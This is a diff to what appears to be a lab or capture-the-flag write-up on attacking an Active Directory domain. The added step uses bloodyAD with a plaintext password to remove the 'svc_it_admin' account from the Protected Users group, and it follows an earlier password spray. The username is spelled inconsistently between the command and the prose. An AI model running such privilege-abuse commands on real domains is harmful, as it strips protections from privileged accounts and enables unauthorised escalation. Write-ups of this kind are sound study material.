@@ -1093,3 +1093,12 @@ permission: CREATE_CHILD
 
 This new user has write access on protected users, i saw earlier on the password spray there was a user with a restriction which a lot of the time means they are part of protected users
 
+# Removing `svc_it_admin` from `protected users`
+
+```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -u david.cokx -p 'pa$$word12' remove groupMember 'Protected Users' 'svc_it_admin'
+[+] svc_it_admin removed from Protected Users
+```
+
+So using the privs of `david.kocx` i can remove the user from the group!
+
